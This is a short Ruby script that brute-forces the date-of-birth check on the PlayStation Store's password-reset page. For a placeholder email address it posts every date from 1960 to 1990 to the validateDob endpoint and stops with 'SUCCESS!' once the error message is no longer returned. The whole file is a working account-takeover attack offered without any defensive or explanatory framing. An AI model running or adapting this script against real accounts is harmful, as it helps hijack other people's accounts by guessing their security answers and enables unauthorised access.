require "open-uri"
require "net/http"
require "net/https"

(1..12).each do |m|
	(1..31).each do |d|
		1990.downto( 1960 ) do |y|
			puts "%04d-%02d-%02d" % [ y, m, d ]
			
			data = "account.loginName=EMAIL%40DOMAIN.COM" + ( "&account.dob=%02d&account.mob=%02d&account.yob=%04d" % [ d, m, y ] )

			http = Net::HTTP.new( "store.playstation.com", 443 )
			http.use_ssl = true
			headers = { "Content-Type" => "application/x-www-form-urlencoded" }
			resp, data = http.post( "/accounts/reset/validateDob.action", data, headers )
			
			if not resp.body =~ /Please check your entries carefully./
				puts "SUCCESS!"
				exit
			end
		end
	end
end